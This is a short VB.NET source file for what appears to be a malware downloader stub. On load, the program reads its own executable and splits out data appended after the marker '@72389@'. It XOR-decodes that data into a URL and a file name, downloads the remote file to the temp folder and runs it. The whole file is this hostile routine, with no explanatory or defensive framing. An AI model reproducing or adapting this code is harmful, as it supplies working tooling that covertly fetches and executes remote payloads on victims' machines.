Imports System.IO
Public Class Form1

    Dim tempPath As String = System.IO.Path.GetTempPath
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Const FileSplit = "@72389@"
        Dim text1, text2, t1, t2 As String
        Dim II() As String
        FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
        text1 = Space(LOF(1))
        text2 = Space(LOF(1))
        FileGet(1, text1)
        FileGet(1, text2)
        FileClose(1)
        II = Split(text1, FileSplit)
        Dim i As Short
        Dim KeyChar As Integer
        KeyChar = Asc("++")
        For i = 1 To Len(II(1))
            t1 &= Chr(KeyChar Xor Asc(Mid(II(1), i, 1)))
        Next
        For i = 1 To Len(II(2))
            t2 &= Chr(KeyChar Xor Asc(Mid(II(2), i, 1)))
        Next
        If System.IO.File.Exists(tempPath + t2) = True Then
            System.IO.File.Delete(tempPath + t2)
        End If
        My.Computer.Network.DownloadFile(t1, tempPath + t2)
        'System.Threading.Thread.Sleep(3000)
        System.Diagnostics.Process.Start(tempPath + t2)
        Me.Close()
    End Sub
End Class
